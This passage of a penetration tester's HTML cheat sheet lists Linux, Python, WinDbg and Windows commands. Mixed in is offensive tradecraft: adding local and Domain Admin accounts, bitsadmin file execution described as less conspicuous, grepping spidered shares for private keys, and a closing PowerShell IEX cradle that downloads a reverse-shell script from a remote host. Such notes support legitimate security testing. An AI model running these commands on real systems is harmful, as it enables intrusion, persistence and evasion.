<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>echo -n &#39;Invoke-WebRequest -Uri &quot;http://www.contoso.com&quot; -OutFile &quot;C:\path\file&quot;&#39; | iconv -f UTF8 -t UTF16LE | base64 -w 0
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a># Remove the % character at the end
</span></code></pre></div></li>
</ul>
<h2 id="rsync">Rsync</h2>
<ul>
<li>Similar to SCP but better overall especially long term[^8]
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>rsync -azP root@192.168.1.1:/home/some_directory ./
</span></code></pre></div></li>
</ul>
<h2 id="compressed-rdp-for-low-bandwidth">Compressed RDP for low bandwidth</h2>
<ul>
<li>Lower your MTU first
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>    ifconfig mtu 1200 &lt;interface&gt;
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>    ifconfig mtu 1200 tun0
</span></code></pre></div></li>
<li>rdesktop
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>    rdesktop -a 16 -z -r sound:remote -x b -g 1900x1000 -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; 192.168.1.5
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>    rdesktop -a 16 -z -r sound:remote -x b -g 1900x1000 -u master -p masterlab 192.168.1.5
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>    rdesktop -a 16 -P -z -E -T &lt;TAG-WindowName&gt; -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password or &#39;-&#39; for prompt&gt; 192.168.1.5
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>    rdesktop -a 16 -P -z -E -T COMPANY-DC3 -d company.local -u administrator -p P@ssw0rd 192.168.1.5
</span></code></pre></div></li>
</ul>
<h2 id="encrypting-files">Encrypting files</h2>
<h3 id="zip8">zip[^8]</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>zip -e secure.tar.xz.zip notsecure.tar.xz -P someGoodPassword
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>unzip secure.tar.xz.zip
</span></code></pre></div>
<h3 id="tar-openssl910">tar &amp; OpenSSL[^9][^10]</h3>
<ul>
<li>Unreliable decryption (Have not yet figured out if it's due to different openssl versions or arch)</li>
<li>This one requires an active tty, need to manually type passphrase
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>tar --xz -cvf - *  | openssl enc -e -aes256 -out secured.tar.gz
</span></code></pre></div></li>
<li>Did not work in some instances, try on Debian
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>tar --xz -cvf - *  | openssl enc -e -aes256 -out secured.tar.gz -pass file:&lt;( echo -n &quot;someGoodPassword&quot; )
</span></code></pre></div></li>
<li>Decryption
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>openssl enc -d -aes256 -in secured.tar.gz | tar --xz -xv
</span></code></pre></div></li>
</ul>
<h2 id="generate-random-passwords">Generate random passwords</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>openssl rand 256 | sha256sum | cut -d &quot; &quot; -f1
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>SERVICE_PASSWORD=$(openssl rand 32 | sha256sum | cut -d&#39; &#39; -f1)
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>echo $SERVICE_PASSWORD
</span></code></pre></div>
<h2 id="go-through-filenames-with-spaces">Go through filenames with spaces</h2>
<ul>
<li>Basic[^11]
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>    find . -type f -name &#39;*.*&#39; -print0 | 
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>    while IFS= read -r -d &#39;&#39; file; do
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>        printf &#39;%s\n&#39; &quot;$file&quot;
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>    done
</span></code></pre></div></li>
<li>Sample Use Case:</li>
<li>Export thunderbird inbox to get attachments and move all of the exported attachments into 1 folder for easy viewing/archiving</li>
<li>
<p>In Thunderbird: 
<code>ImportExportTools NG -&gt; Export all messages in the folder - &gt; as single text file (with attachments)</code></p>
</li>
<li>
<p>Sample command:
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>find ../Thunderbird_Export/ -type f -name &#39;*.*&#39; -print0 | while IFS= read -r -d &#39;&#39; file; do mv &quot;$file&quot; .;done
</span></code></pre></div></p>
</li>
</ul>
<h2 id="list-files-and-sort-via-date-time">List files and sort via date time</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>ls -t
</span></code></pre></div>
<h2 id="sort-contents-of-a-file-in-reverse">Sort contents of a file in reverse</h2>
<ul>
<li>Sort from the last letter to the first [^13]</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>rev file.txt | sort | rev
</span></code></pre></div>
<h2 id="beep">Beep</h2>
<ul>
<li>Beep! [^14]</li>
<li>Useful when you want to get notified if a task has finished (i.e. nmap scan, hashcat cracking). </li>
<li>Productivity, no idle time/processing power</li>
<li>
<p>Make sure the Sound card is enabled on the VM settings</p>
</li>
<li>
<p>Basic Usage
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>   sudo apt install beep
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>   sudo env -i beep
</span></code></pre></div></p>
</li>
<li>Practical Usage
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>   echo &#39;alias beep=&quot;sudo env -i beep&quot;&#39; &gt; ~/.zshrc
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>   source ~/.zshrc
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>   sudo nmap -sn iL subnets.txt &amp;&amp; beep
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>   sudo hashcat -a 0 hash.list rockyou.txt &amp;&amp; beep
</span></code></pre></div></li>
</ul>
<h2 id="grep-for-file-extensions">grep for file extensions</h2>
<ul>
<li>This is when scouring a list not your own filesystem</li>
<li>I use this when looking for spidered shares</li>
<li>If you search for <code>.pub</code> for example, you may end up seeing <code>....Web.Publishing/notcool.js</code></li>
<li>Which is why we search for a file extension beside <code>\n</code> [^15]</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>sudo apt install -y pcregrep
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>cat spidered_shares.txt|pcregrep -M &quot;\.pub.\n&quot;
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>cat spidered_shares.txt|pcregrep -M &quot;\.key.\n&quot;
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>cat spidered_shares.txt|pcregrep -M &quot;\.ppk.\n&quot;
</span></code></pre></div>
<h1 id="mobile-app-security-testing">Mobile App Security Testing</h1>
<p>Some commands</p>
<h2 id="logcat">Logcat</h2>
<ul>
<li>Following process</li>
<li>Can be made more verbose/detailed though
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>    adb logcat --pid=$(adb shell pidof -s &lt;mobile_app_name_i.e._com.imacompany.imanandroidapp&gt;)
</span></code></pre></div></li>
</ul>
<h1 id="useful-tips-and-tricks-in-python">Useful tips and tricks in Python</h1>
<h2 id="template-or-skeleton-script-with-tips-and-references">TEMPLATE or Skeleton script with tips and references</h2>
<ul>
<li>This can be found in <a href="https://github.com/trojand/Script_Yard/blob/main/TEMPLATE.py">TEMPLATE.py</a> which is in the <a href="https://github.com/trojand/Script_Yard">Script_Yard</a> repo</li>
</ul>
<h2 id="generate-requirementstxt">Generate requirements.txt</h2>
<ul>
<li>JCharisTech<a href="[Siongui](https://siongui.github.io/2018/03/06/go-print-http-response-header/)">^1</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>pip3 install pipreqs
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>pipreqs /path/to/project
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a># OR
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>pipreqs $(pwd)
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a># Manually check the requirements.txt also by installing pip3 install -r requirements.txt
</span></code></pre></div></li>
</ul>
<h2 id="update-all-pip-packages">Update all pip packages</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>python3 -m pip install --upgrade pip
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>pip3 list --outdated --format=freeze | grep -v &#39;^\-e&#39; | cut -d = -f 1  | xargs -n1 pip3 install -U
</span></code></pre></div>
<h2 id="global-variables">Global Variables</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a># Below &quot;import&quot; &lt;insert_package_names&gt;
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>timeout = None
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>def imAFunction():
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>  if i &gt; timeout:
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>    print(&quot;Greater than timeout&quot;)
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a># Inside function. In this example main()
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>global timeout 
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a>timeout = args.timeout
</span></code></pre></div>
<h2 id="url-encode-python-string">URL Encode Python String</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>import urllib.parse
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>action = urllib.parse.quote_plus(&quot;GET_[TO]-THE&quot;)
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>location = urllib.parse.quote_plus(&quot;CHOPP@!&quot;)
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>url = &quot;www.domain.com:2323/whatever?action=%s&amp;location=%s&quot; % (action,location)
</span></code></pre></div>
<h2 id="accept-custom-certificate">Accept custom certificate</h2>
<ul>
<li>When using proxy (i.e. Burp), rather than using <code>verify=False</code> in the <code>request.get</code> or <code>request.post</code>, convert the Burp certificate cacert.der instead to cacert.pem then use in on python requests. <a href="[StackOverflow](https://stackoverflow.com/questions/1583219/how-to-do-a-recursive-find-replace-of-a-string-with-awk-or-sed)">^2</a></li>
<li>Most common use case is the usage of burp certificate for python requests SSL error.
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a># Converting cacert.der to cacert.pem
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a># openssl x509 -in cacert.der -inform DER -outform PEM -out cacert.pem
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>r = session.post(burp0_url, headers=burp0_headers, data=burp0_data,proxies=proxies,verify=&quot;cacert.pem&quot;)
</span></code></pre></div></li>
</ul>
<h1 id="windbg">WinDbg</h1>
<h2 id="shortcut-keys">Shortcut Keys</h2>
<ul>
<li>++f6++ : Attach a process</li>
<li>++ctrl+break++ : Break (Force breakpoint)</li>
</ul>
<h2 id="basic-commandsshortcuts">Basic commands/shortcuts</h2>
<ul>
<li><code>g</code>  : Go/Continue from breakpoint</li>
<li><code>u</code> : Unassemble (View/Display the assembly translation from memory)</li>
<li><code>u</code> : Display from EIP</li>
<li><code>u &lt;address/symbol&gt;</code></li>
<li><code>u kernel32!GetCurrentThread</code></li>
<li><code>d&lt;X&gt;</code> : Read process memory content</li>
<li><code>db &lt;args&gt;</code> : Display bytes</li>
<li><code>dw &lt;args&gt;</code> : Display WORD  (2 bytes)</li>
<li><code>dd &lt;args&gt;</code> : Display DWORD (4 bytes)</li>
<li><code>dq &lt;args&gt;</code> : Display QWORD (8 bytes)</li>
<li><code>dc &lt;args&gt;</code> : Display DWORD w/ASCII (8 bytes)</li>
<li><code>dW &lt;args&gt;</code> : Display WORD  w/ASCII (2 bytes)</li>
<li><code>d&lt;X&gt; &lt;address/symbol+0xOFFSET&gt; &lt;L&lt;X&gt;&gt;</code> : Common Arguments</li>
<li><code>d&lt;X&gt; KERNELBASE+0x40 L8</code></li>
<li><code>d&lt;X&gt; poi(esp) L4</code></li>
<li>Notes:</li>
<li><code>poi(X)</code> : Pointer to Data</li>
<li><code>L&lt;X&gt;</code> : Display Length depends on the value of X in <code>d&lt;X&gt;</code></li>
<li><code>dt &lt;structure&gt;</code>: Display Type (Display Structure)</li>
<li><code>dt ntdll!_TEB</code></li>
<li><code>dt &lt;structure&gt; @$teb</code> : To get address if field is a Ptr(Pointer)</li>
<li><code>dt &lt;structure&gt; &lt;@$teb&gt; &lt;field&gt;</code> : For specific field only</li>
<li>Notes:</li>
<li><code>?? sizeof(&lt;structure&gt;)</code> : To get size of structure</li>
<li><code>e&lt;X&gt; &lt;address/register&gt;</code> : Edit memory</li>
<li><code>ed esp 50505050</code></li>
<li><code>ea esp "hello"</code></li>
<li><code>s -&lt;X&gt; 0 L?80000000 &lt;bytes/keyword&gt;</code> : Search in memory. "0 L?80000000" means whole memory space</li>
<li><code>s -d L?80000000 50505050</code></li>
<li><code>s -a L?80000000 "trojand"</code></li>
<li><code>r</code> : Inspect Registers</li>
<li><code>r esp</code></li>
<li><code>r esp=50505050</code> : Editing Registers</li>
<li><code>b&lt;X&gt; &lt;args&gt;</code> : Breakpoint</li>
<li><code>bp &lt;symbol/address&gt;</code> : Insert breakpoint</li>
<li><code>bp kernel32!ReadFile</code></li>
<li><code>bl</code> : List breakpoints</li>
<li><code>bd &lt;#&gt;</code> : Disable breakpoint <number></li>
<li><code>be &lt;#&gt;</code> : Enable breakpoint <number></li>
<li><code>be 0</code></li>
<li><code>bc &lt;#&gt;</code> : Clear breakpoint number</li>
<li><code>bc *</code> : Clear all breakpoints</li>
<li><code>bu &lt;module&gt;</code> : Breakpoint at an unresolved endpoint(module that is not yet loaded)</li>
<li><code>ba &lt;e/w/r&gt; &lt;bytes&gt; &lt;module/address&gt;</code> : Hardware breakpoints</li>
<li>Use to monitor access and changes in memory</li>
<li>Does not alter code to put <code>INT 3</code> instruction, see it as it is</li>
<li><code>ba e 1 kernel32!WriteFile</code></li>
<li><code>ba w 2 &lt;address&gt;</code> : monitor if first letter will be modified(edited) in memory. i.e. editing notepad without saving</li>
<li>Breakpoint-based actions:</li>
<li><code>bp &lt;symbol/address&gt; "&lt;args&gt;"</code></li>
<li><code>bp &lt;symbol/address&gt; "&lt;.if (&lt;condition&gt;) {&lt;if_condition_met_args&gt;} .else {&lt;else_condition_met_args&gt;}&gt;"</code></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>bp kernel32!WriteFile &quot;.if (poi(esp + 0x0C) == 4) {.printf \&quot;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\nHey it&#39;s 4 bytes! Stopping at breakpoint now...\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\&quot;} .else {.printf \&quot;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\nThe number of bytes written is %p \\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\&quot;,poi(esp + 0x0C);.echo;gc;}&quot;
</span></code></pre></div>
<ul>
<li><code>p</code> : Executes single instruction on a breakpoint. Steps <em>over</em> the function call.</li>
<li><code>t</code> : Executes single instruction on a breakpoint. Steps <em>inTo</em> the function call.</li>
<li><code>pt</code> : Step to next <em>return</em> (<code>ret</code>) instruction</li>
<li>
<p><code>ph</code> : Step to next <em>brancHing</em> (<code>je/jne</code>) instruction</p>
</li>
<li>
<p><code>lm</code> : Display <strong>L</strong>oaded <strong>M</strong>odules</p>
</li>
<li><code>lm m &lt;module_keywo*&gt;</code> : Browse Modules</li>
<li><code>lm m kernel*</code></li>
<li><code>x &lt;module&gt;!&lt;symbo*&gt;</code> : e<strong>X</strong>amine symbols</li>
<li><code>x kernelbase!String*</code></li>
<li><code>x KERNELBASE!StringCchLength</code></li>
<li>
<p><code>.reload /f</code> : force reload modules (if not yet loaded)</p>
</li>
<li>
<p><code>? &lt;hex&gt; &lt;operand&gt; &lt;hex&gt;</code> : WinDbg Calculation</p>
</li>
<li><code>? b - 1</code> : Equals <code>a</code></li>
<li><code>? &lt;hex&gt;</code> : From hex to hex but producing decimal value on the left of <code>=</code>.</li>
<li><code>? a</code> : <code>10 = 0000000a</code></li>
<li><code>? 0n&lt;decimal&gt;</code> : From decimal to hex.</li>
<li><code>? 0n10</code> : <code>10 = 0000000a</code></li>
<li><code>? 0n10</code> : From binary to hex but producing decimal value on the left of <code>=</code>. </li>
<li><code>? 0y1111</code> : <code>15 = 0000000f</code></li>
<li><code>.formats &lt;hex&gt;</code> : Display format in different types</li>
<li><code>.formats 54&gt;</code> : below</li>
</ul>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>     Evaluate expression:
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>     Hex:     00000054
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>     Decimal: 84
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>     Octal:   00000000124
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>     Binary:  00000000 00000000 00000000 01010100
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>     Chars:   ...T
</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>     Time:    Wed Dec 31 16:01:24 1969
</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a>     Float:   low 1.17709e-043 high 0
</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a>     Double:  4.15015e-322
</span></code></pre></div>
* Pseudo Registers(Variables) : <code>@$t0</code> to <code>@$t19</code>
* <code>r @$t0 = (5454 - 54) * 0n10</code>
* <code>r @$t0</code> : <code>$t0=00034800</code>
* <code>r @$t1 = @$t0 &gt;&gt; 8</code>
* <code>r @$t1</code> : <code>$t1=00000348</code></p>
<ul>
<li><code>.cls</code> : clear screen</li>
</ul>
<h1 id="useful-commands-in-windows">Useful commands in Windows</h1>
<h2 id="windows-command-prompt">Windows - Command Prompt</h2>
<h3 id="find-a-file">Find a file</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>dir &quot;\secretfile&quot; /s
</span></code></pre></div>
<h3 id="find-strings-in-files">Find strings in files</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>findstr /s /i &quot;FLAG{&quot; C:\*.*
</span></code></pre></div>
<h3 id="find-multiple-words-strings-and-patterns">Find multiple words, strings and patterns</h3>
<ul>
<li>(Equivalent of <code class="language-bash highlight">grep<span class="w"> </span>-e<span class="w"> </span>WORD1<span class="w"> </span>-e<span class="w"> </span>WORD2<span class="w"> </span>-e<span class="w"> </span>WORD3</code>)
<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>findstr /C:WORD1 /C:WORD2 /C:WORD3 FILENAME.TXT
</span></code></pre></div></li>
</ul>
<h3 id="enable-default-local-administrator-account">Enable default local "administrator" account</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>net user administrator /active:yes
</span></code></pre></div>
<h3 id="adding-local-accounts-must-have-system-privileges">Adding local accounts (Must have system privileges)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>net user trojand imashortpassword /add
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>net localgroup administrators trojand /add
</span></code></pre></div>
<h3 id="adding-a-domain-admin-account">Adding a Domain Admin account</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>net group &quot;Domain Admins&quot;
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>net user trojandDA P@ssw0rd /add /domain
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>net group &quot;Domain Admins&quot; trojandDA /add /domain
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>net group &quot;Domain Admins&quot;
</span></code></pre></div>
<h3 id="list-files-using-tree">List files using <code class="language-bash highlight">tree</code></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>tree /f
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>tree /f /a &gt; tree.txt
</span></code></pre></div>
<h3 id="change-user-password">Change user password</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>net user trojand imareallyreallyreallylongpasswordnow
</span></code></pre></div>
<h3 id="windows-built-in-plink-for-relay">Windows Built-in Plink for relay</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>netsh interface portproxy add v4tov4 listenport=&lt;LPORT&gt; listenaddress=0.0.0.0 connectport=&lt;RPORT&gt; connectaddress=&lt;RHOST&gt;
</span></code></pre></div>
<h3 id="show-wireless-interfaces">Show wireless interfaces</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>netsh wlan show networks mode=bssid
</span></code></pre></div>
<h3 id="check-for-logged-on-users">Check for logged on users</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>query user
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>qwinsta
</span></code></pre></div>
<h3 id="list-local-drives1">List local drives<a href="[Siongui](https://siongui.github.io/2018/03/06/go-print-http-response-header/)">^1</a></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>wmic logicaldisk get description,name | findstr /C:&quot;Local&quot;
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>fsutil fsinfo drives
</span></code></pre></div>
<h3 id="bitsadmin4">bitsadmin[^4]</h3>
<h4 id="copying-a-file">Copying a File</h4>
<ul>
<li>Better than copy. Less conspicuous by having the service do it for you.
<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>bitsadmin /create JOB &amp; bitsadmin /addfile JOB &lt;LOCAL_SRC&gt; &lt;LOCAL_DST&gt; &amp; bitsadmin /resume JOB &amp; bitsadmin /complete JOB
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>bitsadmin /create JOB &amp; bitsadmin /addfile JOB %SystemRoot%\System32\cmd.exe C:\Users\Administrator\cmd.exe &amp; bitsadmin /resume JOB &amp; bitsadmin /complete JOB
</span></code></pre></div></li>
</ul>
<h4 id="execute-a-file">Execute a file</h4>
<ul>
<li>Good for executing files as this will run under <code>svchost -k netsvcs</code> as a child process and not under you command prompt
<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>bitsadmin /create JOB &amp; bitsadmin /addfile JOB &lt;LOCAL_SRC&gt; &lt;LOCAL_DST&gt; &amp; bitsadmin /SetNotifyCmdLine JOB &lt;PROGRAM_NAME&gt; &lt;PARAMETERS&gt; &amp; bitsadmin /resume JOB &amp; bitsadmin /reset
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>bitsadmin /create JOB &amp; bitsadmin /addfile JOB %TEMP%\test1.txt %TEMP%\test2.txt &amp; bitsadmin /SetNotifyCmdLine JOB C:\Windows\System32\calc.exe NULL &amp; bitsadmin /resume JOB &amp; bitsadmin /reset
</span></code></pre></div></li>
</ul>
<hr />
<h2 id="windows-powershell">Windows - Powershell</h2>
<h3 id="nested-quotes-or-wrapping-multiple-double-quotes">Nested quotes or wrapping multiple double quotes</h3>
<ul>
<li>Triple double quotes to make one double quote.</li>
<li>In the example below, the whole RCE command is taken as a variable. Think of the single quotes also as the command portion in your RCE expoits.
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>    <span class="n">var</span> <span class="n">g</span> <span class="p">=</span> <span class="s1">&#39;powershell -Exec Bypass -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&quot;&quot;&quot;http://10.0.1.5:1337/reverse.ps1&quot;&quot;&quot;)&quot;&#39;</span>
</span></code></pre></div></li>
